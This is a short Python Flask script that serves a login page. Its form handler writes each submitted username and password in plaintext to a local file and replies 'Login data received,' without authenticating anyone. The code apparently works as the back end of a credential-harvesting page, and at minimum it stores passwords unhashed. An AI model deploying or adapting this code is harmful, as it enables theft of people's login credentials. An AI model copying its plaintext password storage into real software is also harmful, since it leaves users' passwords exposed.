# Resources:
#1. https://flask.palletsprojects.com/en/stable/



from flask import Flask, render_template, request

app = Flask(__name__)

# Route to display the login page
@app.route('/')
def index():
    return render_template('index.html')

# Route to handle login form submission
@app.route('/index', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')
    
    with open("user_data.txt", 'a') as file:
        file.write(f"Username : {username}, Password: {password}\n")
    
    # Send a response back to the user
    return "Login data received."

